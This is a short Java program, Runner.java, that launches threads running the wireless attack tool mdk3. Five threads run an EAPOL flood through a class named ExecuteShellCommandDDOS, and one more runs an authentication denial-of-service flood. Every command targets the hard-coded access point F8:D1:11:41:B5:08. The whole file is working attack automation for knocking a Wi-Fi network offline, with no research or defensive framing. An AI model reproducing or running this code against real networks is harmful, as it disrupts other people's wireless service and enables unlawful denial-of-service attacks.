/**
 * Created by georgipavlov on 17.03.16.
 */
public class Runner {
    public static void main(String[] args) {



        long waitTime = (long) (1000*19);
        int howMany =5;
        long howManyMinutes = 60000*1;
        Thread one;
        for (int i = 0; i < howMany ; i++) {
            one = new Thread(
                   new ExecuteShellCommandDDOS("sudo mdk3 mon1 x 0 -t  F8:D1:11:41:B5:08 -n \"519\" -s 250",System.currentTimeMillis(),waitTime,howManyMinutes)
            );
            one.start();
            for (int j = 0; j < 100000 ; j++) {}

        }

        Thread runnable =



                new Thread(new ExecuteShellCommandEAPOL(
                        "sudo mdk3 mon1 a -a F8:D1:11:41:B5:08 -m ",System.currentTimeMillis(),waitTime,howManyMinutes)
                );
        runnable.start();

    }
}
